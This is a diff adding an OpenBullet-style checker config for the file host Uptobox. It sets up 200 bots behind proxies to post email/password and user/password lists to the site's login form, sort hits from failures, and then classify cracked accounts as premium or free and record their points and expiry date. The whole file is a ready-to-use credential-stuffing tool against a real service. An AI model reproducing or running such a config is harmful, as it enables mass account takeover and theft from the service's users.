@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Uptobox",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-08T22:45:50.2169883+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://uptobox.com/?op=login&referer=homepage" 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://uptobox.com" 
+  HEADER "referer: https://uptobox.com/?op=login&referer=homepage" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY ">Logout<" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect Login or Password" 
+REQUEST GET "https://uptobox.com/?op=my_account" 
+  CONTENT "https://uptobox.com/?op=my_account" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Premium member" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Free member" 
+PARSE "<SOURCE>" LR "<label>Number of points UTB : </label><strong><span class='red'>" "</span></strong" -> CAP "Nombre de points" 
+PARSE "<SOURCE>" LR "<span class='expiration-date red'>" "</span></strong>" -> CAP "Expire" 
